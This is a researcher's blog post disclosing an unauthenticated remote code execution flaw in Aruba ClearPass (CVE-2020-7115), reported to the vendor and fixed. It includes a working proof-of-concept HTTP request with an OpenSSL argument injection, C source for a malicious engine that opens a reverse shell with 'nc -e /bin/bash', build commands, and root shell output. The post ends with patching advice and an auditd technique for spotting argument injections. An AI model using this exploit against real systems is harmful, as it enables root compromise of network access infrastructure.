---
title:  "Aruba Clearpass RCE (CVE-2020-7115)"
layout: post
date:   2020-09-18
permalink: posts/aruba-clearpass-rce
---

**Unauthenticated RCE in Aruba ClearPass Policy Manager <= 6.9.0 (CVE-2020-7115)**

I discovered an unauthenticated RCE vulnerability in Aruba ClearPass Policy Manager that I reported to Aruba, and it is now fixed. The Aruba security bulletin is available at [ARUBA-PSA-2020-005.txt](https://www.arubanetworks.com/assets/alert/ARUBA-PSA-2020-005.txt). Exploiting this vulnerability uses a couple of interesting tricks that I'll explain in this post. 

## Discovery
I first discovered something interesting when I was looking through the unauthenticated attack surface of ClearPass, and grabbed a list of actions from the `struts.xml` file, and fed them to Burp Intruder. Several pages returned a response other than a 302 to the login page, although the majority of these were login related. The most interesting of these was the `tipsSimulationUpload.action` endpoint, which returned a 200 response to a GET request with the message "No file has been uploaded". 

After looking at the application log to figure out what was going on, I found it needed a few parameters to be set. By reading the application's decompiled Java code, I figured out this was an upload endpoint for certificate files, used in the "Policy Simulation" functionality of the application. A valid call to the endpoint looks like:

```
POST /tips/tipsSimulationUpload.action HTTP/1.1
Host: 192.168.200.81
Connection: close
Content-Length: 16425
Content-Type: multipart/form-data; charset="utf-8"; boundary=----WebKitFormBoundarySCYwHjrAcRBmbkPK
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundarySCYwHjrAcRBmbkPK
Content-Disposition: form-data; name="clientPassphrase"

password
------WebKitFormBoundarySCYwHjrAcRBmbkPK
Content-Disposition: form-data; name="uploadClientCertFile"; filename="a.pfx"
Content-Type: application/octet-stream

<CERT FILE>
------WebKitFormBoundarySCYwHjrAcRBmbkPK--
```

In my experience, certificate handling code is a rewarding area to audit, as developers often shell out to the OpenSSL binary, rather than handling the certificate using a code library. In the case of ClearPass, if a client certificate was uploaded in the call to the endpoint, the contents were copied to a temporary file in the `/tmp/` directory. The temporary file was created using the Java `createTempFile` function, which gives the temporary file a random name, and a fixed extension, so that the file looks like `/tmp/clientCertFile{RAND}.txt` This means that we have no ability to control the file name, only the contents. 

After the certificate contents were copied into the temporary file, the code attempted to "validate" the client certificate by determining whether the password parameter in the request was able to decrypt the certificate. This was performed by passing the temporary file name and the password as arguments to a shell script, which called `openssl pkcs12` and checked whether it returned successfully or not. 

The shell script looked like this:

**verifyClientCertFile.sh**
```
#! /bin/bash

openssl pkcs12 -in $1 -passin pass:$2 -noout -nokeys > /dev/null
```

Unfortunately for attackers, this shell script is invoked from Java by breaking up the arguments into an String array, then passing the array to ProcessBuilder. Under the hood ProcessBuilder will use execve on a String[], which prevents command injection.

However, as the "pass" argument in the `verifyClientCertFile.sh` script is not quoted, we do have the ability to inject **arguments** to OpenSSL, which can result in arbitrary code execution.  This is something I have detailed in further in my [OpenSSL argument injection](openssl-arginjection) post. 

Basically the short version is that if 

a) you are able to place a file on disk that can be interpreted as an OpenSSL engine file

b) you can provide and control the `-engine` argument to OpenSSL

then you can execute arbitrary code. Often the tricky part of this is getting the engine file on disk for OpenSSL to execute. Not content with leaving this as an authenticated issue (there are many post-authentication ways of uploading files in ClearPass), I tried to figure a way around. I then realised that the certificate upload was not validated to see if it looked like a certificate - it was just placed in the temporary file as is, and then passed to the validation shell script. Of course, the problem here is that we don't know the uploaded file name, as it is randomly generated. I briefly checked the implementation to see if the randomness was in some way predictable, but in OpenJDK this is [implemented using SecureRandom](https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/io/File.java#l1901). 

What I then realised is that as the password argument passes unquoted through a shell script, we can the wildcard character * , which will be evaluated. This means we don't actually **need to know** the uploaded file name - we can just pass a path like `/tmp/clientCertFile*.txt` and the shell script will substitute in a valid path for us! 

This lack of quoting means we can upload an OpenSSL engine file as the certificate, and in the same request set the passphrase to an argument injection that references the temporary certificate file without knowing its actual name. 

After firing off a request with the passphrase `'a' -engine /tmp/clientCertFile*.txt` and a compiled OpenSSL engine file I received a reverse shell:

```
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.200.81.
Ncat: Connection from 192.168.200.81:60246.
id
uid=0(root) gid=0(root) groups=0(root)

```

## Proof of Concept
The final proof of concept HTTP request looks like:

```
POST /tips/tipsSimulationUpload.action HTTP/1.1
Host: 192.168.200.81
Connection: close
Content-Length: 16425
Cache-Control: max-age=0
Origin: https://192.168.200.81
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; charset="utf-8"; boundary=----WebKitFormBoundarySCYwHjrAcRBmbkPK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36
Sec-Fetch-Dest: iframe
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Referer: https://192.168.200.81/tips/tipsContent.action
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundarySCYwHjrAcRBmbkPK
Content-Disposition: form-data; name="clientPassphrase"

'a' -engine /tmp/clientCertFile*.txt
------WebKitFormBoundarySCYwHjrAcRBmbkPK
Content-Disposition: form-data; name="uploadClientCertFile"; filename="a.pfx"
Content-Type: application/octet-stream

<OPENSSLENGINEBINARY>
------WebKitFormBoundarySCYwHjrAcRBmbkPK--
```

and engine file:

```
#include <unistd.h>

__attribute__((constructor))
        static void init() {
                    execl("/bin/sh", "sh", "-c","nc -e /bin/bash <IP> 1234",NULL);
        }

```
compile with:
`gcc -fPIC -o a.o -c a.c && gcc -shared -o a.so -lcrypto a.o`


If you are trying to replicate this, the POC will only work the first time. This is because when the disk contains multiple clientCertFiles they are all passed as arguments, which is not a valid way to call OpenSSL. You can work around this! - figuring out how is up to you. 


This bug was reported to Aruba, and fixed in 6.9.1. The best mitigation for this issue and others is to ensure you keep your ClearPass instance up to date with the latest patches, and restrict network access to the management interface to authorised endpoints.


#### BONUS: Finding argument injections

One of the best ways I have discovered to find and validate argument injections in complex code is to set up the auditd daemon, and monitor calls to shells and binaries that are being called such as OpenSSL and tar. You can do it like (taken [from here](https://serverfault.com/questions/736753/how-to-log-execution-of-a-specific-binary-script-using-auditd-or-other)):

```
# systemctl start auditd 
# auditctl -w /bin/sh -p x -k my_execs
# auditctl -w /bin/bash -p x -k my_execs
# auditctl -w /bin/openssl -p x -k my_execs
# ausearch -i -k my_execs
```

The ausearch command will display the invocations of the two shells and OpenSSL. So in the case of this ClearPass vulnerability, when we submit the passphrase  `'a' /tmp/a*` the ausearch command shows the following invocations (some information trimmed)

```
type=EXECVE msg=audit(09/17/2020 13:54:28.528:34154) : argc=4 a0=/bin/bash a1=/usr/local/avenda/tips/bin/tipsAdmin/verifyClientCertFile.sh a2=/tmp/clientCertFile3903733629309270609.txt a3=a /tmp/a* 
--
type=EXECVE msg=audit(09/17/2020 13:54:28.530:34155) : argc=9 a0=openssl a1=pkcs12 a2=-in a3=/tmp/clientCertFile3903733629309270609.txt a4=-passin a5=pass:a a6=/tmp/avenda-postgresql.conf a7=-noout a8=-nokeys 
```

Note the `/tmp/a*` is expanded to `/tmp/avenda-postgresql.conf`, a file that exists on disk. You can also see the `a3=a /tmp/a*` in the bash execution, and in the OpenSSL execution the value has been split like `a5=pass:a a6=/tmp/avenda-postgresql.conf`. When you see that arguments you have provided separated by a space or spacelike character are split into different a{N} values, this indicates an argument injection is possible. An unsuccessful injection in non-vulnerable code would have an OpenSSL call that looked like this:

```
type=EXECVE msg=audit(09/17/2020 11:25:22.153:5227) : argc=8 a0=openssl a1=pkcs12 a2=-in a3=/tmp/clientCertFile4516591877132007270.txt a4=-passin a5=pass:a /tmp/a* a6=-noout a7=-nokeys 
```
In this one the wildcard was not expanded, and the spaces have not separated the `a` from the `/tmp/a*` path into a5 and a6.

